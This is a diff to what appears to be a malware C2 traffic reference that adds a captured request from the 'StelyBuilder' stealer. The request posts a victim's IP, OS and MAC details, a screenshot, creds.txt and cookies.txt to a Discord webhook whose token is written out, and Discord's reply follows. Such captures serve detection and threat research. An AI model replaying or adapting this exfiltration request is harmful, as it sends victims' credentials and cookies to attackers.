@@ -3298,6 +3298,66 @@ Host: thankg1.org
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/smokeloader.png "Smokeloader")
 
+#### StelyBuilder (stealer)
+~~~
+POST /api/webhooks/848953655281320046/ZSrVJ-rBOW7B0MEj8lHMqJpevQ7e2tubaBOd-YTUHdw6Pk6qudkXbUqDA9u6xOqJyFGk HTTP/1.1
+Content-Type: multipart/form-data; boundary=----------------------------8d927948cc57064
+Host: discord.com
+Content-Length: 69917
+Expect: 100-continue
+Connection: Keep-Alive
+
+------------------------------8d927948cc57064
+Content-Disposition: form-data; name="content";
+
+```asciidoc
+Hi, I got a new account!
+== Standard info == 
+IP :: 46.244.28.15
+OS :: Microsoft Windows 7 Professional 
+MAC Address :: 06B2996D78FE
+== Browser Account == 
+Browser Account :: N/A
+Browser Nitro :: N/A
+Browser Tokens :: 
+== Discord Account == 
+Discord Account :: N/A
+Discord Nitro :: No
+Discord token :: N/A
+- JustSvK ;D```
+------------------------------8d927948cc57064
+Content-Disposition: form-data; name="screen.jpg"; filename="screen.jpg"
+Content-Type: application/octet-stream
+
+HTTP/1.1 200 OK
+Date: Fri, 04 Jun 2021 20:08:44 GMT
+Content-Type: application/json
+Transfer-Encoding: chunked
+Connection: keep-alive
+set-cookie: __dcfduid=83c4086157294e7084e184d65f0f45a2; Expires=Wed, 03-Jun-2026 20:08:44 GMT; Max-Age=157680000; Secure; HttpOnly; Path=/
+strict-transport-security: max-age=31536000; includeSubDomains; preload
+x-ratelimit-bucket: 3cd1f278bd0ecaf11e0d2391374c011d
+x-ratelimit-limit: 5
+x-ratelimit-remaining: 4
+x-ratelimit-reset: 1622837327
+x-ratelimit-reset-after: 2
+x-envoy-upstream-service-time: 175
+Via: 1.1 google
+Alt-Svc: h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400, h3=":443"; ma=86400
+CF-Cache-Status: DYNAMIC
+cf-request-id: 0a7a3d80c70000424ac22e8000000001
+Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v2?s=nylML2gqoJTP71M4xCvNZxP2X2as8i2Cj1uNqpxd7BDvu9lFKudNXUYWRAnCsmmjszVMvMN9x8qkwGnjXpnA1kS4O%2FkhY1DzBzkgkQvXVwlFw8HAn1KqAA%3D%3D"}],"group":"cf-nel","max_age":604800}
+NEL: {"report_to":"cf-nel","max_age":604800}
+X-Content-Type-Options: nosniff
+Server: cloudflare
+CF-RAY: 65a3cb7add71424a-LHR
+
+{"id": "850466121801924668", "type": 0, "content": "```asciidoc\nHi, I got a new account!\n== Standard info == \nIP :: 46.244.28.15\nOS :: Microsoft Windows 7 Professional \nMAC Address :: 06B2996D78FE\n== Browser Account == \nBrowser Account :: N/A\nBrowser Nitro :: N/A\nBrowser Tokens :: \n== Discord Account == \nDiscord Account :: N/A\nDiscord Nitro :: No\nDiscord token :: N/A\n- JustSvK ;D```", "channel_id": "848953638326894686", "author": {"bot": true, "id": "848953655281320046", "username": "Thomas", "avatar": "1c10b14e6bb806dd6141d56993851a34", "discriminator": "0000"}, "attachments": [{"id": "850466121325084732", "filename": "screen.jpg", "size": 64405, "url": "https://cdn.discordapp.com/attachments/848953638326894686/850466121325084732/screen.jpg", "proxy_url": "https://media.discordapp.net/attachments/848953638326894686/850466121325084732/screen.jpg", "width": 1280, "height": 720, "content_type": "image/jpeg"}, {"id": "850466121484337172", "filename": "creds.txt", "size": 1779, "url": "https://cdn.discordapp.com/attachments/848953638326894686/850466121484337172/creds.txt", "proxy_url": "https://media.discordapp.net/attachments/848953638326894686/850466121484337172/creds.txt", "content_type": "text/plain; charset=utf-8"}, {"id": "850466121617899520", "filename": "cookies.txt", "size": 2760, "url": "https://cdn.discordapp.com/attachments/848953638326894686/850466121617899520/cookies.txt", "proxy_url": "https://media.discordapp.net/attachments/848953638326894686/850466121617899520/cookies.txt", "content_type": "text/plain; charset=utf-8"}], "embeds": [], "mentions": [], "mention_roles": [], "pinned": false, "mention_everyone": false, "tts": false, "timestamp": "2021-06-04T20:08:44.334000+00:00", "edited_timestamp": null, "flags": 0, "components": [], "webhook_id": "848953655281320046"}
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/stely1.png "StelyBuilder")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/stely2.png "StelyBuilder")
+
 #### Taurus Stealer
 ~~~
 POST /gate/cfg/?post=1&data=r3u6t8u3w8u6t8u3w8 HTTP/1.1
